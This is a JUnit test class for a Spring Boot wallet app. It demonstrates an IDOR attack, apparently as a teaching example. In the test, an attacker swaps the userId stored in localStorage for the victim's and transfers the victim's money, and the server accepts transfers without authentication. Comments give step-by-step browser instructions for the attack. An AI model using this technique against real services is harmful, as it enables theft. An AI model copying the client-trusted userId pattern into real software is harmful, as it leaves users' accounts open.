package app;

import org.junit.jupiter.api.*;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.test.context.jdbc.Sql;
import org.springframework.test.web.servlet.MockMvc;

import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

/**
 * ╔══════════════════════════════════════════════════════════════════╗
 * ║  IDOR ATTACK DEMONSTRATION                                      ║
 * ║  Insecure Direct Object Reference — A Classic Web Vulnerability ║
 * ╚══════════════════════════════════════════════════════════════════╝
 *
 * This test demonstrates how an attacker can steal money by changing
 * the userId in localStorage.
 *
 * ATTACK FLOW:
 *   1. Victim creates account → gets userId
 *   2. Attacker creates account → gets userId
 *   3. Frontend stores userId in localStorage
 *   4. ⚡ ATTACK: Attacker opens DevTools, changes localStorage.userId to victim's
 *   5. Attacker sends money using victim's userId
 *   6. Server transfers FROM victim's wallet!
 *
 * WHY THIS WORKS:
 *   The server TRUSTS the userId from the client.
 *   No JWT, no session, no way to verify WHO is making the request.
 */
@SpringBootTest
@AutoConfigureMockMvc
@TestMethodOrder(MethodOrderer.OrderAnnotation.class)
@Sql(statements = {"DELETE FROM logins", "DELETE FROM wallets", "DELETE FROM users"},
     executionPhase = Sql.ExecutionPhase.BEFORE_TEST_CLASS)
class IdorAttackTest {

    @Autowired
    private MockMvc mockMvc;

    private static Long victimId;
    private static Long attackerId;

    @Test
    @Order(1)
    @DisplayName("STEP 1: Create two user accounts")
    void step1_createAccounts() throws Exception {
        // Victim signs up
        String victimResponse = mockMvc.perform(post("/api/auth/signup")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("""
                                {"name":"Victim","email":"victim@email.com","password":"password123"}
                                """))
                .andExpect(status().isOk())
                .andReturn().getResponse().getContentAsString();

        // Extract userId from response
        victimId = extractUserId(victimResponse);

        // Attacker signs up
        String attackerResponse = mockMvc.perform(post("/api/auth/signup")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("""
                                {"name":"Attacker","email":"attacker@email.com","password":"password123"}
                                """))
                .andExpect(status().isOk())
                .andReturn().getResponse().getContentAsString();

        attackerId = extractUserId(attackerResponse);

        System.out.println();
        System.out.println("╔══════════════════════════════════════╗");
        System.out.println("║  STEP 1: Two accounts created        ║");
        System.out.println("║  Victim   userId=" + victimId + " balance=$100     ║");
        System.out.println("║  Attacker userId=" + attackerId + " balance=$100     ║");
        System.out.println("╚══════════════════════════════════════╝");
    }

    @Test
    @Order(2)
    @DisplayName("STEP 2: Both users check their wallets")
    void step2_checkWallets() throws Exception {
        mockMvc.perform(get("/api/wallet").param("userId", victimId.toString()))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.wallet.balance").value(100));

        mockMvc.perform(get("/api/wallet").param("userId", attackerId.toString()))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.wallet.balance").value(100));

        System.out.println();
        System.out.println("╔══════════════════════════════════════╗");
        System.out.println("║  STEP 2: Both wallets verified       ║");
        System.out.println("║  Victim   wallet = $100              ║");
        System.out.println("║  Attacker wallet = $100              ║");
        System.out.println("╚══════════════════════════════════════╝");
    }

    @Test
    @Order(3)
    @DisplayName("STEP 3: ⚡ ATTACK — Attacker changes userId in localStorage")
    void step3_attack() throws Exception {
        // ╔═══════════════════════════════════════════════════════╗
        // ║  THIS IS THE ATTACK!                                 ║
        // ║                                                       ║
        // ║  What the attacker does in the browser:               ║
        // ║                                                       ║
        // ║  1. Open Chrome DevTools (F12)                        ║
        // ║  2. Go to Application tab → Local Storage             ║
        // ║  3. Find: localStorage.setItem("userId", "2")        ║
        // ║  4. Change to: localStorage.setItem("userId", "1")   ║
        // ║  5. Frontend now sends victim's userId!               ║
        // ║                                                       ║
        // ║  Here we simulate: attacker sends request with        ║
        // ║  victimId instead of their own attackerId             ║
        // ╚═══════════════════════════════════════════════════════╝

        // ⚡ Attacker sends $50, but uses VICTIM's userId as sender!
        mockMvc.perform(post("/api/wallet/send")
                        .contentType(MediaType.APPLICATION_JSON)
                        .param("userId", victimId.toString())  // VICTIM'S ID — STOLEN!
                        .content("""
                                {"recipientEmail":"attacker@email.com","amount":50}
                                """))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.message").value("Transfer successful!"));

        System.out.println();
        System.out.println("╔══════════════════════════════════════╗");
        System.out.println("║  STEP 3: ⚡ ATTACK EXECUTED!          ║");
        System.out.println("║                                      ║");
        System.out.println("║  Attacker sent $50 to own email       ║");
        System.out.println("║  But used VICTIM's userId as sender!  ║");
        System.out.println("║                                      ║");
        System.out.println("║  Server transferred FROM victim's     ║");
        System.out.println("║  wallet because it trusted the userId ║");
        System.out.println("╚══════════════════════════════════════╝");
    }

    @Test
    @Order(4)
    @DisplayName("STEP 4: Verify — Victim lost money, Attacker gained money")
    void step4_verify() throws Exception {
        mockMvc.perform(get("/api/wallet").param("userId", victimId.toString()))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.wallet.balance").value(50));

        mockMvc.perform(get("/api/wallet").param("userId", attackerId.toString()))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.wallet.balance").value(150));

        System.out.println();
        System.out.println("╔══════════════════════════════════════╗");
        System.out.println("║  STEP 4: THEFT CONFIRMED!            ║");
        System.out.println("║                                      ║");
        System.out.println("║  Victim   wallet: $100 → $50  (-$50) ║");
        System.out.println("║  Attacker wallet: $100 → $150 (+$50) ║");
        System.out.println("║                                      ║");
        System.out.println("║  The attacker stole $50 by simply     ║");
        System.out.println("║  changing the userId in localStorage! ║");
        System.out.println("╚══════════════════════════════════════╝");
    }

    @Test
    @Order(5)
    @DisplayName("STEP 5: Server NEVER verified who is logged in")
    void step5_noAuth() throws Exception {
        // We never logged in, never showed a token — just sent a userId!
        mockMvc.perform(post("/api/wallet/send")
                        .contentType(MediaType.APPLICATION_JSON)
                        .param("userId", victimId.toString())
                        .content("""
                                {"recipientEmail":"attacker@email.com","amount":10}
                                """))
                .andExpect(status().isOk());

        System.out.println();
        System.out.println("╔══════════════════════════════════════╗");
        System.out.println("║  STEP 5: NO AUTHENTICATION NEEDED!   ║");
        System.out.println("║                                      ║");
        System.out.println("║  We never logged in.                 ║");
        System.out.println("║  We never provided a password.       ║");
        System.out.println("║  We never showed a JWT token.        ║");
        System.out.println("║                                      ║");
        System.out.println("║  We just sent userId=" + victimId + " and the       ║");
        System.out.println("║  server did exactly what we asked!   ║");
        System.out.println("║                                      ║");
        System.out.println("║  THIS is why you need authentication!║");
        System.out.println("╚══════════════════════════════════════╝");
    }

    /** Extract "id" field from JSON response string. */
    private Long extractUserId(String json) {
        // Simple extraction: find "id":123 in the response
        String marker = "\"id\":";
        int start = json.indexOf(marker) + marker.length();
        int end = json.indexOf(",", start);
        if (end == -1) end = json.indexOf("}", start);
        return Long.parseLong(json.substring(start, end).trim());
    }
}
